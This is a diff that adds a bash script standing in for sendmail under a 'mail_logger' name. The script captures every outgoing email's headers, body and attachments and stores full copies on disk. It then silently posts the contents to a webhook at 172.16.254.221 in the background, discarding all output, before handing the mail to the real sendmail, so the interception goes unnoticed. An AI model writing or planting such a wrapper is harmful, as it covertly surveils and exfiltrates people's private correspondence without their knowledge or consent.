@@ -1,0 +1,70 @@
+#!/bin/bash
+
+# Configuration Variables
+LOGFILE="/var/log/mail_logger.log"
+ATTACHMENT_DIR="/var/log/mail_attachments"
+WEBHOOK_URL="http://172.16.254.221:9696/webhook"
+REAL_SENDMAIL="/usr/sbin/sendmail.real"
+
+# Ensure the attachment directory exists
+mkdir -p "$ATTACHMENT_DIR"
+
+# Create a temporary file to store the email content
+EMAIL_CONTENT=$(mktemp)
+cat > "$EMAIL_CONTENT"
+
+# Extract headers
+TO=$(grep -i "^To:" "$EMAIL_CONTENT" | head -n 1)
+FROM=$(grep -i "^From:" "$EMAIL_CONTENT" | head -n 1)
+CC=$(grep -i "^Cc:" "$EMAIL_CONTENT" | head -n 1)
+SUBJECT=$(grep -i "^Subject:" "$EMAIL_CONTENT" | head -n 1)
+
+# Extract body (everything after the first blank line)
+BODY=$(awk '/^$/, NR > 1 { print }' "$EMAIL_CONTENT" | head -c 5000)  # Capture first 5000 chars of body
+
+# Extract and store attachments
+ATTACHMENT_FILES=()
+BOUNDARY=$(grep -i "^Content-Type: multipart" "$EMAIL_CONTENT" | sed -n 's/.*boundary="\([^"]*\)".*/\1/p')
+
+if [[ -n "$BOUNDARY" ]]; then
+    csplit -s -f "$ATTACHMENT_DIR/part_" "$EMAIL_CONTENT" "/--$BOUNDARY/" '{*}'
+    for file in "$ATTACHMENT_DIR"/part_*; do
+        if file "$file" | grep -q "text"; then
+            continue  # Skip text parts (they are usually email body parts)
+        fi
+        ATTACHMENT_FILES+=("$file")
+    done
+fi
+
+# Save full email content for reference
+EMAIL_LOG_PATH="$ATTACHMENT_DIR/email_$(date +%s).log"
+cp "$EMAIL_CONTENT" "$EMAIL_LOG_PATH"
+
+# Log email metadata
+{
+  echo "To: $TO"
+  echo "From: $FROM"
+  echo "Cc: $CC"
+  echo "Subject: $SUBJECT"
+  echo "Body: $BODY"
+  echo "Attachments: ${ATTACHMENT_FILES[*]}"
+  echo "Full Email Log: $EMAIL_LOG_PATH"
+  echo "------------------------"
+} >> "$LOGFILE"
+
+# Send email metadata to webhook
+curl -X POST -H "Content-Type: application/json" -d "{
+  \"to\": \"$TO\",
+  \"from\": \"$FROM\",
+  \"cc\": \"$CC\",
+  \"subject\": \"$SUBJECT\",
+  \"body\": \"$BODY\",
+  \"attachments\": \"${ATTACHMENT_FILES[*]}\",
+  \"email_log\": \"$EMAIL_LOG_PATH\"
+}" "$WEBHOOK_URL" &>/dev/null &
+
+# Pass original email to real sendmail
+"$REAL_SENDMAIL" "$@" < "$EMAIL_CONTENT"
+
+# Cleanup temp file
+rm -f "$EMAIL_CONTENT"
